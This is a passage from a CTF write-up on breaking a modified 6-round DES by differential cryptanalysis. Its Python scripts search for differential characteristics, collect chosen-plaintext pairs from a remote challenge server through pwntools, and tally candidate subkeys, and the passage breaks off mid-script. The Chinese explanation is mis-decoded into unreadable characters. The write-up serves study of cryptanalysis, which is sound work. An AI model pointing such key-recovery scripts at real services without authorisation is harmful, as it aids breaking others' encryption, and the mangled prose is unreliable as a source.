</span></span></code></pre></td></tr></table></div></div><h3 id=idiot-box>idiot box</h3><p><strong>Second Blood</strong></p><p>æ”¹è¿‡çš„DES 6è½®å·®åˆ†æ”»å‡»</p><p>ç°å­¦ï¼š</p><ul><li><a href=https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41>https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41</a></li><li><a href=http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf>http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf</a></li></ul><blockquote><p>ç°å­¦ææ–™é‡Œä¸€ä¸ªå¯èƒ½çš„ç–‘æƒ‘ç‚¹ï¼šç¬¬4è½®çš„Få‡½æ•°ä¸­ï¼Œæœ‰5ä¸ªsboxçš„input(6bit)çš„å·®åˆ†å€¼éƒ½æ˜¯0ï¼Œæ‰€ä»¥è¿™5ä¸ªsboxçš„output(4bit)çš„å·®åˆ†å€¼ä¹Ÿéƒ½æ˜¯0ï¼Œç»è¿‡Pç½®æ¢åï¼Œå¾—åˆ°çš„D&rsquo;ä¸­æœ‰4*5=20bitæ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥åé¢ç¬¬6è½®çš„Få‡½æ•°çš„outputçš„å·®åˆ†å€¼:$F&rsquo; = c&rsquo; \oplus D&rsquo; \oplus T_L&rsquo;$ä¸­ï¼Œæœ‰20bitæ˜¯ç¡®å®šçš„ï¼›ç»è¿‡<strong>é€†</strong>Pç½®æ¢åï¼Œå¾—åˆ°ç¬¬6è½®8ä¸ªsboxçš„outputsçš„å·®åˆ†å€¼ï¼Œå…¶ä¸­æœ‰5ä¸ªå¯¹åº”çš„sboxçš„outputçš„å·®åˆ†å€¼æ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥èƒ½ç”¨mediumé‡Œçš„é‚£ä¸ªæ–¹æ³•æŠŠè¿™5ä¸ªsboxçš„keyæ±‚å‡ºæ¥ã€‚</p><p>c&rsquo;ä¸ºç¬¬3ä¸ªFå‡½æ•°inputçš„å·®åˆ†å€¼ï¼ŒD&rsquo;ä¸ºç¬¬4ä¸ªFå‡½æ•°inputçš„å·®åˆ†å€¼ï¼ŒF&rsquo;ä¸ºç¬¬6ä¸ªFå‡½æ•°outputçš„å·®åˆ†å€¼ï¼Œ$T_L&rsquo;$æ˜¯å¯†æ–‡å·¦åŠéƒ¨åˆ†çš„å·®åˆ†å€¼ã€‚</p></blockquote><p><strong>æ”»å‡»æ–¹æ³•</strong></p><p>DESé‡Œé¢å°±sboxæ¯”è¾ƒéš¾æï¼Œå…¶ä»–çš„éƒ¨åˆ†å°±æ˜¯ä¸€äº›çº¿æ€§ç½®æ¢ï¼Œå¯ä»¥é€šè¿‡ä¸€äº›å·®åˆ†ç‰¹æ€§å»æ“ä½œä¸€ä¸‹è¿™ä¸ªsboxï¼Œç„¶åå°±èƒ½å¾—åˆ°keyã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯ï¼Œæ‰¾åˆ°ä¸€ä¸ªå·®åˆ†ç‰¹å¾åï¼Œå¯ä»¥ç”¨è¿™ä¸ªç‰¹å¾æ¨4è½®ï¼Œç„¶åè®¡ç®—$F&rsquo; = c&rsquo; \oplus D&rsquo; \oplus T_L&rsquo;$ï¼ˆç¬¬6è½®Få‡½æ•°outputçš„å·®åˆ†å€¼ï¼‰ï¼Œé€†Pç½®æ¢ï¼Œå¾—åˆ°8ä¸ªsboxçš„outputsçš„å·®åˆ†å€¼out_xorsï¼Œè¿™ä¸ªå·®åˆ†å€¼çš„æ¦‚ç‡æ˜¯æœ€å¤§çš„ï¼›æ¥ç€ï¼Œå°†2ä¸ªå·²çŸ¥çš„ç¬¬6è½®Få‡½æ•°çš„inputï¼ˆå¯†æ–‡çš„å³åŠéƒ¨åˆ†ï¼‰å»åšeæ‰©å±•ï¼Œå¾—åˆ°$I_1, I_2$ï¼Œåˆ†åˆ«åˆ†æˆ8ç»„${i_{11}, i_{12}, &mldr;, i_{18}}, {i_{21}, i_{22}, &mldr;, i_{28}}$ï¼Œå¯¹åº”ç€8ä¸ªsboxã€‚</p><p>æ¯ä¸€ä¸ªsboxï¼Œå¯¹æ‰€æœ‰å¯èƒ½çš„64ç§keyï¼ˆ6bitï¼‰ä½œåˆ¤æ–­sbox($i_{1j}$ ^ key) ^ sbox($i_{2j}$ ^ key) == out_xors[j]ï¼Œå¦‚æœç­‰äºï¼Œåˆ™å°†è¯¥keyè®¡æ•°åŠ 1ã€‚å°è¯•å¾ˆå¤šæ¬¡åï¼Œå¿…ç„¶æœ‰ä¸€ä¸ªkeyå‡ºç°çš„æ¬¡æ•°æœ€å¤šï¼Œä¸”è¿œè¶…å…¶ä»–çš„keyï¼Œè¯¥keyå³ä¸ºæ­£ç¡®çš„keyã€‚</p><p>è¿™8ä¸ª6bitçš„keyåˆèµ·æ¥å°±æ˜¯ç¬¬6è½®çš„subkeyï¼Œåˆç”±äºå¯†é’¥æ‰©å±•å°±æ˜¯ä¸€ä¸ªç½®æ¢ï¼Œå¯ä»¥åæ¨å‡ºå‰é¢5è½®çš„keyã€‚</p><p>æŠŠkeyåè¿‡æ¥åŠ å¯†å°±èƒ½getflagã€‚</p><p><strong>æ‰‹åŠ¨å¯»æ‰¾å·®åˆ†ç‰¹å¾</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>Counter</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_diff_output</span><span class=p>(</span><span class=n>diff</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>p1</span> <span class=o>^</span> <span class=n>diff</span>
</span></span><span class=line><span class=cl>    <span class=n>k</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=mi>48</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c1</span><span class=p>,</span> <span class=n>c2</span> <span class=o>=</span> <span class=n>F</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span> <span class=n>k</span><span class=p>),</span> <span class=n>F</span><span class=p>(</span><span class=n>p2</span><span class=p>,</span> <span class=n>k</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>c1</span><span class=o>^</span><span class=n>c2</span><span class=p>,</span> <span class=p>(</span><span class=n>p1</span><span class=p>,</span><span class=n>p2</span><span class=p>,</span><span class=n>c1</span><span class=p>,</span><span class=n>c2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>counter</span> <span class=o>=</span> <span class=n>Counter</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>P_</span> <span class=o>=</span> <span class=mh>0x00000040</span>
</span></span><span class=line><span class=cl>    <span class=n>X_</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>gen_diff_output</span><span class=p>(</span><span class=n>P_</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>counter</span><span class=p>[</span><span class=n>X_</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>X_</span><span class=p>,</span> <span class=n>freq</span> <span class=o>=</span> <span class=n>counter</span><span class=o>.</span><span class=n>most_common</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>X_</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span> <span class=n>freq</span> <span class=o>/</span> <span class=mi>10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 0x00000002 -&gt; 0x00000002    0.217</span>
</span></span><span class=line><span class=cl><span class=c1># 0x00000040 -&gt; 0x00000000    0.2534</span>
</span></span><span class=line><span class=cl><span class=c1># 0x00000400 -&gt; 0x00000000    0.251</span>
</span></span><span class=line><span class=cl><span class=c1># 0x00000000 -&gt; 0x00000000    1</span>
</span></span><span class=line><span class=cl><span class=c1># 0x00002000 -&gt; 0x00000000    0.25</span>
</span></span><span class=line><span class=cl><span class=c1># 0x00004000 -&gt; 0x00000040    0.22</span>
</span></span><span class=line><span class=cl><span class=c1># 0x00020000 -&gt; 0x00020000    0.18</span>
</span></span></code></pre></td></tr></table></div></div><p>å‘ç°äº†å¥½å‡ ç»„éå¸¸ä¼˜ç§€çš„å·®åˆ†ç‰¹å¾ã€‚</p><p>ä»¥å‰æˆ‘ä¹ˆå¾—é€‰æ‹©ï¼Œç°åœ¨æˆ‘éšä¾¿é€‰ã€‚</p><p>å°±é€‰è¿™ä¸ª0x00000040 -> 0x00000000 0.2534</p><p><strong>ç”»å›¾åˆ†æ</strong></p><p><img src=https://hackmd.summershrimp.com/uploads/upload_c126a80567a8eeab248c3b0ff26319cd.png alt></p><blockquote><p>åœ¨çº¿ç”»å›¾ï¼šhttps://draw.io</p></blockquote><p>å¯ä»¥æ¨å‡ºæ¥$F&rsquo; = 0x00000040 \oplus T_L'$</p><p><strong>è·å–æ•°æ®</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python3 data-lang=python3><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>json</span> <span class=kn>import</span> <span class=n>dump</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span><span class=p>,</span> <span class=n>getRandomNBitInteger</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_diff_input</span><span class=p>(</span><span class=n>diff</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>p1</span> <span class=o>^</span> <span class=n>diff</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;81.68.174.63&#34;</span><span class=p>,</span> <span class=mi>34129</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#34;debug&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rec</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;required&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>cipher_flag</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\n([0-9a-f]</span><span class=si>{80}</span><span class=s2>)\n&#34;</span><span class=p>,</span> <span class=n>rec</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>cipher_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pairs</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>10000</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span> <span class=o>=</span> <span class=n>gen_diff_input</span><span class=p>(</span><span class=mh>0x0000000000000040</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>c1</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>keepends</span><span class=o>=</span><span class=kc>False</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>p2</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>c2</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>keepends</span><span class=o>=</span><span class=kc>False</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pairs</span><span class=o>.</span><span class=n>append</span><span class=p>(((</span><span class=n>p1</span><span class=p>,</span><span class=n>p2</span><span class=p>),</span> <span class=p>(</span><span class=n>c1</span><span class=p>,</span><span class=n>c2</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dump</span><span class=p>([</span><span class=n>cipher_flag</span><span class=p>,</span> <span class=n>pairs</span><span class=p>],</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>å·®åˆ†æ”»å‡»</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>Counter</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>json</span> <span class=kn>import</span> <span class=n>load</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cipher_flag</span><span class=p>,</span> <span class=n>pairs</span> <span class=o>=</span> <span class=n>load</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_key</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>inv_key</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=mi>48</span>
</span></span><span class=line><span class=cl>    <span class=n>key_bin</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>key</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>48</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>48</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>inv_key</span><span class=p>[</span><span class=n>pc_key</span><span class=p>[</span><span class=n>j</span><span class=p>]]</span> <span class=o>=</span> <span class=n>key_bin</span><span class=p>[</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>inv_key</span><span class=p>),</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_keys</span><span class=p>(</span><span class=n>k6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>keys</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=mi>6</span>
</span></span><span class=line><span class=cl>    <span class=n>keys</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>k6</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>keys</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>inv_key</span><span class=p>(</span><span class=n>keys</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>keys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_p</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>x_bin</span> <span class=o>=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>_</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>bin</span><span class=p>(</span><span class=n>x</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>y_bin</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>y_bin</span><span class=p>[</span><span class=n>pbox</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span> <span class=o>=</span> <span class=n>x_bin</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>str</span><span class=p>(</span><span class=n>_</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=n>y_bin</span><span class=p>]),</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>y</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --------------------------</span>
</span></span><span class=line><span class=cl><span class=n>candidate_keys</span> <span class=o>=</span> <span class=p>[</span><span class=n>Counter</span><span class=p>()</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span><span class=p>,</span> <span class=n>cs</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=n>pairs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>c1</span><span class=p>,</span> <span class=n>c2</span> <span class=o>=</span> <span class=n>cs</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>c1</span> <span class=o>^</span> <span class=n>c2</span> <span class=o>==</span> <span class=mh>0x0000004000000000</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>l1</span><span class=p>,</span> <span class=n>l2</span> <span class=o>=</span> <span class=n>c1</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=p>,</span> <span class=n>c2</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>r1</span><span class=p>,</span> <span class=n>r2</span> <span class=o>=</span> <span class=n>c1</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=p>,</span> <span class=n>c2</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(r1, r2)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>F_</span> <span class=o>=</span> <span class=n>l1</span><span class=o>^</span><span class=n>l2</span><span class=o>^</span><span class=mh>0x00000040</span>
</span></span><span class=line><span class=cl>    <span class=n>F_</span> <span class=o>=</span> <span class=n>inv_p</span><span class=p>(</span><span class=n>F_</span><span class=p>)</span> <span class=c1># xor of the two outputs of sbox, 32bit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Ep1</span> <span class=o>=</span> <span class=n>e</span><span class=p>(</span><span class=n>r1</span><span class=p>)</span> <span class=c1># 48bit</span>
</span></span><span class=line><span class=cl>    <span class=n>Ep2</span> <span class=o>=</span> <span class=n>e</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span> <span class=c1># 48bit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>inp1</span> <span class=o>=</span> <span class=p>(</span><span class=n>Ep1</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>7</span><span class=o>-</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mb>0b111111</span>   <span class=c1># 6bit</span>
</span></span><span class=line><span class=cl>        <span class=n>inp2</span> <span class=o>=</span> <span class=p>(</span><span class=n>Ep2</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>7</span><span class=o>-</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mb>0b111111</span>   <span class=c1># 6bit</span>
</span></span><span class=line><span class=cl>        <span class=n>out_xor</span> <span class=o>=</span> <span class=p>(</span><span class=n>F_</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>7</span><span class=o>-</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mb>0b1111</span>   <span class=c1># 4bit</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>s</span><span class=p>(</span><span class=n>inp1</span><span class=o>^</span><span class=n>key</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span> <span class=o>^</span> <span class=n>s</span><span class=p>(</span><span class=n>inp2</span><span class=o>^</span><span class=n>key</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span> <span class=o>==</span> <span class=n>out_xor</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>candidate_keys</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>key</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>candidate_keys</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ----------------------</span>
</span></span><span class=line><span class=cl><span class=n>key6</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>candidate_keys</span><span class=p>:</span>
